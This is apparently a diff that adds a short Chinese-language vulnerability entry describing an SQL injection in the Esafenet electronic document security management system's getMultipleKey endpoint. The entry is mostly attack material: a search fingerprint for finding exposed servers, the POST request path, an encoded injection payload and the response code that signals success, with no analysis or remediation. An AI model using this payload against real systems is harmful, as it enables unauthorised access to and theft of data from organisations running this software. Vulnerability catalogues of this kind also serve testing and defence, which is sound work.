@@ -1,0 +1,11 @@
+# 亿赛通电子文档安全管理系统getMultiplekey存在SQL注入漏洞
+
+亿赛通电子文档安全管理系统 ｜ SQL注入 ｜ —
+- **指纹**：`body="/CDGServer3/index.jsp"`
+- **请求**：`POST /CDGServer3/security/getMultipleKey HTTP/1.1`
+
+**Payload**
+```
+HKMDJCFOBFCGPDHKKCFNLGDDJNCCAJAFEGAPMMPOPPFMELPHAOFBNECCBEEEGHBLJLJHIIHIDNMIKMLKNOIPDICIMGHPPIELFHAMPNEPJPDOILJFILKJIKGBKDMPJHEEDAFMFNDBGAGAFNDLFMGPCD
+```
+- **响应特征**：200
